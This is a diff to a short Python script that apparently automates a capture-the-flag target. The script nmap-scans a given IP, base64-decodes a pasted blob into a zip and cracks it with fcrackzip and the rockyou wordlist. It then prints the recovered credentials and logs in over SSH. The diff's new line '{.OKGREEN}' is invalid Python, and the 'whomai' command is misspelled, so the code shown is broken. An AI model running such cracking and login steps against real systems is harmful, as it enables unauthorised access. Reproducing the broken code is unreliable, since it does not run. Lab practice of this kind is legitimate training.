@@ -11,7 +11,7 @@ os.system(f'nmap -sV -sC {ip}')
 ba64 = input("Enter The base64 code showing in nmap scan(remove spaces from the code): ")
 os.system(f'echo {ba64} | base64 -d > decode.zip;fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt decode.zip;unzip decode.zip')
 os.system('clear')
-print(f"{root.OKGREEN}SSH LOGIN PASSWORD FOUND!{root.END}")
+print(f"{.OKGREEN}SSH LOGIN PASSWORD FOUND!{.END}")
 os.system('cat creds.txt')
 
 print("--------------------------------")
@@ -27,5 +27,5 @@ print('''
 os.system(f'ssh fortune@{ip}')
 os.system('whomai')
 
-#rootpiebot :)
+
 
